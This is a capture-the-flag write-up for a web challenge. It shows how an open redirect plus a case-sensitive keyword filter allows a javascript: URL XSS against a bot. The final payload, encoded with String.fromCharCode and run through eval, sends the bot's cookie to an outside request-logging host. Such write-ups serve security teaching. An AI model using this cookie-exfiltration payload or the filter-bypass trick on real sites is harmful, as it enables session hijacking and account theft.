
# Big in Japan

 * Category: Web
 * Solved by the JCTF Team

## Description

> 皆さんこんにちは！ ボット様はURLが必要！急いで作っていきましょう！ 神聖なURLは稲荷神社の賢いキツネに捧げられます

## Solution

For this challenge, we got a simple website with a submission for labeled "Enter
your URL here". If we try to enter just any URL, we get an error: "Please provide a valid URL 
from the big-in-japan.appsecil.ctf.today domain". When we follow the instructions, we get a
different message: "Success: The URL was clicked successfully".

So, we can enter any URL (as long as it belongs to our subdomain, at least supposedly) and some
bot in the background will click it. This usually means that we need to find an XSS vulnerability
and leak the bot's cookie.

In the sources, we have a pretty big helper - an open redirect snippet:

```html
<script>
    const filteredURLFromBackend = "";
    const urlFromFrontend = new URLSearchParams(location.search).get("url");
    if (urlFromFrontend && filteredURLFromBackend) {
        setTimeout(function () {
            location.href = filteredURLFromBackend;
        }, 1000);
    }
</script>
```

So, if we visit `https://big-in-japan.appsecil.ctf.today/?url=https://www.google.com`, we'll
get redirected after a second to `https://www.google.com`.

We can use a service that logs any request made to it and enter a URL such as the following:

```
https://big-in-japan.appsecil.ctf.today/?url=https://jctf1.free.beeceptor.com/
```

In such a case, the redirect snippet will be as follows:

```html
<script>
    const filteredURLFromBackend = "https://jctf1.free.beeceptor.com/";
    const urlFromFrontend = new URLSearchParams(location.search).get("url");
    if (urlFromFrontend && filteredURLFromBackend) {
        setTimeout(function () {
            location.href = filteredURLFromBackend;
        }, 1000);
    }
</script>
```

After a short while we should get a hit in the service from the bot's visit. Once we've
confirmed that, we can proceed to the next stage - leaking the cookies.

We want to be able to execute some Javascript code to get the cookie and somehow include
its content in the request to our server (for example, by appending it to the URL path).
How do we do that?

Luckily, we can use `javascript:` URLs for that - these are special URL-like entities which
actually execute Javascript. For example, we can try to visit `https://big-in-japan.appsecil.ctf.today/?url=javascript:alert(1)`
and see what happens. However - we get an error: "Error: The URL contains a banned word: javascript".
It looks like they're blocking this keyword to protect against these kind of URLs.
Fortunately, their filter is very simple, and more specifically - case sensitive, since
visiting `https://big-in-japan.appsecil.ctf.today/?url=JaVaScRiPt:alert(1)` actually triggers
an alert!

We continue crafting our malicious code, and move on to trying to make a request via Javascript:

```
https://big-in-japan.appsecil.ctf.today/?url=JaVaScRiPt:fetch('https://jctf1.free.beeceptor.com/')
```

This however becomes the following, meaning that our string is being escaped:

```html
<script>
    const filteredURLFromBackend = "JaVaScRiPt:fetch(&amp;#39;https://jctf1.free.beeceptor.com/&amp;#39;)";
    const urlFromFrontend = new URLSearchParams(location.search).get("url");
    if (urlFromFrontend && filteredURLFromBackend) {
        setTimeout(function () {
            location.href = filteredURLFromBackend;
        }, 1000);
    }
</script>
```

To bypass that, we'll use `eval` and `String.fromCharCode` to encode our payload:

```javascript
location.href="https://jctf1.free.beeceptor.com/" + document.cookie
```

We can define a Python helper function to encode any string we want:

```python
>>> to_fromcharcode = lambda s: f"String.fromCharCode({','.join(str(ord(c)) for c in s)})"
>>> to_fromcharcode('location.href="https://jctf1.free.beeceptor.com/" + document.cookie')
'String.fromCharCode(108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,115,58,47,47,106,99,116,102,49,46,102,114,101,101,46,98,101,101,99,101,112,116,111,114,46,99,111,109,47,34,32,43,32,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101)'
```

The result doesn't include quotes, making it safe to use in our case.

Finally, we submit the following URL:

```
https://big-in-japan.appsecil.ctf.today/?url=JaVaScRiPt:eval(String.fromCharCode(108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,115,58,47,47,106,99,116,102,49,46,102,114,101,101,46,98,101,101,99,101,112,116,111,114,46,99,111,109,47,34,32,43,32,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))
```

A few seconds later, we get a hit on our server: `flag=AppSec-IL%7Bomedetto%7D`.

The flag: `flag=AppSec-IL{omedetto}`